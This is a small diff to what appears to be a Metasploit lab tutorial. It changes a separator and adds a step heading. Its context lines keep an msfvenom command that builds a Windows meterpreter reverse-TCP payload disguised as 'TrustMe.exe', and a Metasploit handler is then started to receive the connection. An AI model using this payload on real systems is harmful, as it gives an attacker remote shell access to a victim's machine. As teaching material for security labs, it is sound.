@@ -100,8 +100,9 @@ cd /tmp/
 ```bash
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > TrustMe.exe
 ```
-<br>
+<hr>
 
+## Step 3: Start The Metasploit Handler
 Let's start the **Metasploit Handler**. 
 
 First, lets open a second **Ubuntu Shell** by **Double-Clicking** the icon on the desktop:
